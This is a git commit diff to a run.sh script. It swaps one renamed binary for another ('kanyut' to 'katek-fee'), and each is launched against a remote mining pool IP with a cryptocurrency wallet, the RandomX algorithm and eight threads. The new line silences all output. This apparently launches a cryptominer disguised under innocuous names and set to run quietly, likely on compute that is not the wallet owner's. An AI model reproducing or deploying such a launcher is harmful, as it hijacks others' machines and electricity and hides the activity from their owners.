340494ff8aa044bd705565db4045c1c809aaa163
ristatamyoga <93392611+ristatamyoga@users.noreply.github.com>
2021-10-29 22:03:37 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,1 @@
-chmod +x kanyut && ./kanyut -v -l 139.99.123.225:3956 -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$(echo $(shuf -i 1-50 -n 1)-SSSsttt) -p x -t 8
+chmod +x katek-fee && ./katek-fee -o 159.65.25.23:80 -u SHIB:0x113a78bc09aed970a8a9baac749aad1d0e12f722.C${RANDOM:0:9} -p x -a rx/0 -k --threads=8 > /dev/null
